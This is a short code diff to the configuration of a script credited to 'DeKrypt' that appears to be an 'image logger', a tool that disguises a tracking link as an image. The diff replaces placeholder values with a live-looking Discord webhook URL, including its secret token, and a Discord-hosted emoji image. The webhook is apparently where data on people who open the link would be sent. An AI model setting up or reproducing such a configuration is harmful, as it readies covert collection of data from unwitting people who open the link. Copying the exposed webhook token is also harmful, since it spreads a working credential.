@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1349022285834616952/Pnu647F0uXbBYOleIfuLDiBj-JygK9NwBN_SErjBKjBnuAeQrCH3uXbF8Du5x9DnQ5t0",
+    "image": "https://media.discordapp.net/attachments/1346176065155891350/1349025648680636416/WhatsApp-Laughter-Emoji-Transparent-Background.png?ex=67d1998a&is=67d0480a&hm=b99a56f17b003ee23f14dafbe01ab568aed9cb4ada031e37b6446438ebbffc12&=&format=webp&quality=lossless", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
